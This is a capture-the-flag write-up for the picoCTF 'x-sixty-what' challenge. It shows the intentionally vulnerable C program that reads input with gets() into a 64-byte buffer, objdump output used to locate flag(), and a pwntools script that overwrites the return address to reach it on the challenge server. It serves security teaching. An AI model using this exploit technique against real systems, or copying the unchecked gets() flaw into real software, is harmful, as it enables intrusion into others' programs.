# x-sixty-what

This challenge from [picoCTF](https://play.picoctf.org/practice/challenge/319) is a basic buffer overflow.
First, let's look at the code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```

We can see that we can write on a 64 bytes buffer `buf` an unlimited amount of bytes thanks to the `get` function (it does not perform bounds checking). We will perform a basic RIP to call the `flag` function.
First, we can get the function adress using `objdump`:
```
❯ objdump -d vuln| grep flag
0000000000401236 <flag>:
  40125e:       75 29                   jne    401289 <flag+0x53>
```

To determine the rip size let's look at the `vuln` function

```❯ objdump -d vuln | grep vuln

vuln:     file format elf64-x86-64
00000000004012b2 <vuln>:
  401333:       e8 7a ff ff ff          call   4012b2 <vuln>
❯ objdump -d -j .text --start-address=0x4012b2 vuln


vuln:     file format elf64-x86-64


Disassembly of section .text:

00000000004012b2 <vuln>:
  4012b2:       f3 0f 1e fa             endbr64
  4012b6:       55                      push   %rbp
  4012b7:       48 89 e5                mov    %rsp,%rbp
  4012ba:       48 83 ec 40             sub    $0x40,%rsp
  4012be:       48 8d 45 c0             lea    -0x40(%rbp),%rax
  4012c2:       48 89 c7                mov    %rax,%rdi
  4012c5:       b8 00 00 00 00          mov    $0x0,%eax
  4012ca:       e8 31 fe ff ff          call   401100 <gets@plt>
  4012cf:       90                      nop
  4012d0:       c9                      leave
  4012d1:       c3                      ret

00000000004012d2 <main>:
  4012d2:       f3 0f 1e fa             endbr64
  4012d6:       55                      push   %rbp
  4012d7:       48 89 e5                mov    %rsp,%rbp
  4012da:       48 83 ec 20             sub    $0x20,%rsp
  4012de:       89 7d ec                mov    %edi,-0x14(%rbp)
  4012e1:       48 89 75 e0             mov    %rsi,-0x20(%rbp)
  4012e5:       48 8b 05 84 2d 00 00    mov    0x2d84(%rip),%rax        # 404070 <stdout@GLIBC_2.2.5>
  4012ec:       b9 00 00 00 00          mov    $0x0,%ecx
  4012f1:       ba 02 00 00 00          mov    $0x2,%edx
  4012f6:       be 00 00 00 00          mov    $0x0,%esi
  4012fb:       48 89 c7                mov    %rax,%rdi
  4012fe:       e8 1d fe ff ff          call   401120 <setvbuf@plt>
  401303:       e8 08 fe ff ff          call   401110 <getegid@plt>
  401308:       89 45 fc                mov    %eax,-0x4(%rbp)
  40130b:       8b 55 fc                mov    -0x4(%rbp),%edx
  40130e:       8b 4d fc                mov    -0x4(%rbp),%ecx
  401311:       8b 45 fc                mov    -0x4(%rbp),%eax
  401314:       89 ce                   mov    %ecx,%esi
  401316:       89 c7                   mov    %eax,%edi
  401318:       b8 00 00 00 00          mov    $0x0,%eax
  40131d:       e8 ae fd ff ff          call   4010d0 <setresgid@plt>
  401322:       48 8d 3d 3f 0d 00 00    lea    0xd3f(%rip),%rdi        # 402068 <_IO_stdin_used+0x68>
  401329:       e8 92 fd ff ff          call   4010c0 <puts@plt>
  40132e:       b8 00 00 00 00          mov    $0x0,%eax
  401333:       e8 7a ff ff ff          call   4012b2 <vuln>
  401338:       b8 00 00 00 00          mov    $0x0,%eax
  40133d:       c9                      leave
  40133e:       c3                      ret
  40133f:       90                      nop
.....
```

We know that the `push` instruction will take 8 bytes, so we will need 8 more bytes to overide the RIP.
Finally we can retrieve the flag with 64 junk bytes for the buffer and 8 bytes for the RIP, then we can just add the `flag` adress


# Solve.py

```py
from pwn import *


payload = b'A' * (64 + 8) + p64(0x0000000000401236)

r = remote('saturn.picoctf.net', 58957)

r.recvuntil(b'Welcome to 64-bit. Give me a string that gets you the flag:')
r.sendline(payload)
r.interactive()
```